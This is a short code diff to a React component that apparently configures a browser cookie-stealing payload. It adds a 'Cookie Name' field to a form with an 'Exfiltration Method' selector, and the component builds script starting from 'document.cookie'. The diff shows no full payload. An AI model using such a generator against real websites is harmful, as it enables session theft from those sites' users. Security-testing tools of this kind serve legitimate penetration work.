@@ -1,4 +1,5 @@
 import React from 'react'
+import RecipeTextField from '~/components/RecipeTextField'
 
 export function cook (instance, vars) {
   let cookieSelection = 'var c = document.cookie'
@@ -68,6 +69,15 @@ export function render (instance, setRecipeProperty) {
           )}
         />
       </div>
+
+      <RecipeTextField
+        bindTo="cookie"
+        instance={instance}
+        label="Cookie Name (Optional)"
+        placeholder="(Leave blank to exfiltrate all cookies)"
+        setRecipeProperty={setRecipeProperty}
+      />
+
       <div className="form-group">
         <label htmlFor={`${instance.id}-method`}>Exfiltration Method</label>
         <select id={`${instance.id}-method`}
